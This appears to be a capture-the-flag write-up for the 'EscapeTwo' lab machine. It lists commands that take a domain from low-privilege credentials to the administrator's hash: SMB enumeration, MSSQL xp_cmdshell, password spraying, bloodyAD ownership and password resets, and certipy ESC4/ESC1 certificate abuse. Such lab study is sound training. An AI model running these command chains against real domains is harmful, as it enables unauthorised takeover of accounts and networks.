<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>EscapeTwo</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>EscapeTwo</h1><br/><p>Portscan</p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n --stats-every=5s -Pn -oN scan_txt  10.10.11.51</strong></p><p>	</p><p>User creds rose:KxEPkKe6R8su</p><p></p><p>Mapping SMB</p><p></p><p>	<strong>smbmap -H 10.10.11.51 -u &quot;rose&quot; -p &quot;KxEPkKe6R8su&quot;</strong></p><p>	</p><p><img src="images/189-1.png" alt="images/189-1.png" /></p><p></p><p>Enumerate Users </p><p></p><p>	<strong>nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su --users</strong></p><p></p><p><img src="images/189-2.png" alt="images/189-2.png" /></p><p></p><p>I find the accounts file on a smb share</p><p></p><p>	<strong>smbclient //10.10.11.51/Accounting\ Department -U rose</strong></p><p></p><p><img src="images/189-3.png" alt="images/189-3.png" /></p><p></p><p>This file its a zip file</p><p></p><p><img src="images/189-4.png" alt="images/189-4.png" /></p><p></p><p>In the file sharedStrings.xml  i found creds for the mssql server</p><p></p><p>sa@sequel.htb:MSSQLP@ssw0rd!</p><p></p><p>I connect to the service </p><p></p><p>	<strong>impacket-mssqlclient  sa:&#39;MSSQLP@ssw0rd!&#39;@10.10.11.51</strong></p><p>	</p><p>I enable the cmd shell in the mssql shell</p><p></p><p><img src="images/189-5.png" alt="images/189-5.png" /></p><p></p><p><img src="images/189-6.png" alt="images/189-6.png" /></p><p></p><p>I found a second password on sql-Configuration.INI</p><p></p><p>	ENABLERANU=&quot;False&quot; </p><p>	SQLCOLLATION=&quot;SQL_Latin1_General_CP1_CI_AS&quot;</p><p>	SQLSVCACCOUNT=&quot;SEQUEL\sql_svc&quot;</p><p>	SQLSVCPASSWORD=&quot;WqSZAF6CysDQbGb3&quot;</p><p>	SQLSYSADMINACCOUNTS=&quot;SEQUEL\Administrator&quot;</p><p>	SECURITYMODE=&quot;SQL&quot;</p><p>	SAPWD=&quot;MSSQLP@ssw0rd!&quot;</p><p>	ADDCURRENTUSERASSQLADMIN=&quot;False&quot;</p><p>	TCPENABLED=&quot;1&quot;</p><p></p><p>With this creds i do test this password with all users i find</p><p></p><p><img src="images/189-7.png" alt="images/189-7.png" /></p><p></p><p>I get a reverse shell with evil-wiRM</p><p></p><p><img src="images/189-8.png" alt="images/189-8.png" /></p><p></p><p><img src="images/189-9.png" alt="images/189-9.png" /></p><p></p><p>With ryan i have WriteOwner on CA_SVC who is member of CERT PUBLISHERS</p><p></p><p><img src="images/189-10.png" alt="images/189-10.png" /></p><p></p><p>I will change the password of the CA_SVC for have access to this user and create a certificate</p><p></p><p><strong>	bloodyAD --dc-ip 10.10.11.51 --host dc01.sequel.htb -d sequel.htb -u ryan -p &#39;WqSZAF6CysDQbGb3&#39; set owner &quot;CA_SVC&quot; &quot;ryan&quot;</strong></p><p><strong>	</strong><strong></strong></p><p><strong>	bloodyAD --dc-ip 10.10.11.51 --host dc01.sequel.htb -d sequel.htb -u ryan -p &#39;WqSZAF6CysDQbGb3&#39; add genericAll &quot;CA_SVC&quot; &quot;ryan&quot;</strong></p><p>	</p><p><strong>	bloodyAD --host &quot;dc01.sequel.htb&quot; -d &quot;sequel.htb&quot; --kerberos --dc-ip 10.10.11.51 -u &quot;ryan&quot; -p &#39;WqSZAF6CysDQbGb3&#39; set password &quot;CA_SVC&quot; &quot;GoPwnnetTeam&quot;</strong></p><p>	</p><p>I can exploit for privesc with vuln  CA - ESC4</p><p></p><p>Next I will create a template </p><p></p><p>	<strong>certipy-ad  template -dc-ip 10.129.153.151 -u ca_svc -p &#39;GoPwnnetTeam&#39; -template &quot;DunderMifflinAuthentication&quot; -target dc01.sequel.htb -save-old -target-ip 10.10.11.51</strong></p><p>	</p><p>Then I syncronice the date</p><p></p><p>	<strong>sudo ntpdate -u dc01.sequel.htb</strong></p><p></p><p>Then I exploit ESC1</p><p></p><p><strong>	</strong><strong>certipy-ad req -username ca_svc@sequel.htb -password GoPwnnetTeam -ca sequel-DC01-CA -target sequel.htb -template &quot;DunderMifflinAuthentication&quot; -upn administrator@sequel.htb -target-ip 10.10.11.51 -dc-ip </strong><strong>10.10.11.51</strong></p><p></p><p>[*] Saved certificate and private key to &#39;administrator.pfx&#39;</p><p></p><p><strong>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51</strong></p><p></p><p>And we got the hash for the administrator</p><p></p><p>Got hash for &#39;administrator@sequel.htb&#39;</p><p></p><p><img src="images/189-11.png" alt="images/189-11.png" /></p></div>
</body>
</html>
